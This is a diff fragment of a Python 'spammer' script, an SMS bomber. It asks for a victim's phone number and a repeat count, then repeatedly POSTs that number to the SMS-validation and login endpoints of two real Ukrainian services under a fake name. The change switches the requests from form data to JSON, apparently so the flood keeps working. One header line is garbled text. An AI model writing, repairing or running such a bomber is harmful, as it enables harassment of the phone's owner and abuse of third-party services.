@@ -38,12 +38,12 @@ NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')
 run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-     requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", data={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
+     requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
      print('отправельно')
  except:
      print('не отправлено')
  try:
-     requests.post("https://auth.multiplex.ua/login", data={"login": "+" + number}, headers=headers)
+     requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers)
      print('multiplex')
  except:
      print('Не доставлено (multiplex)')
